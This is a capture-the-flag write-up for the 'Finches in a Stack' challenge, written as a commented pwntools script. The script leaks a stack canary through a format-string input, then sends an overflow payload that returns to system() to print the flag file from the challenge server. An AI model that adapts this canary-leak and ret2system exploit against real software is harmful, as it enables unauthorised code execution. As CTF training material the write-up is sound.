# Finches in a Stack

### Writeup by Sai, 350 points

`There's a service at [...], exploit it to get the flag.`

**NOTE:** This writeup is in the form of a commented Python script which was used in order to exploit the service remotely. 

```python
#!/usr/bin/env python3
from pwn import *
from sys import argv

REMOTE = 0
if len(argv) > 1:
	if 'r' in argv[1]:
		REMOTE = 1

context.terminal = ['tmux', 'splitw']
exe = './fias'
elf = ELF(exe)
host, port = "95.216.233.106", 29445
proc = remote(host, port) if REMOTE else process(exe)

if len(argv) > 1:
	if 'd' in argv[1]:
		DEBUG = 1
		gdb.attach(proc, '''
b *main
b *0x80492da
c
''')

# Stages
# Leak canary
# Gets overflow to system
cat_flag = 0x804a008
canary_off = "%11$p"
system = 0x8049080

# Stage 1 - leak the canary (11th offset)
proc.recv()
proc.sendline(canary_off)
data = proc.recv().split(b'you, ')[1].split(b'!')[0]
canary = int(data,16)
log.info("Canary: 0x%x " % canary)

# Stage 2 - Rop chain and also pass canary
# Call system, with return 0xdeadbeef and params '/bin/cat flag.txt' string pointer
payload  = b"a"*25
payload += p32(canary)
payload += p32(0xdeadbeef)*3
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(cat_flag)
log.info("Payload: %s" % payload.hex())
proc.sendline(payload)
proc.interactive()
```

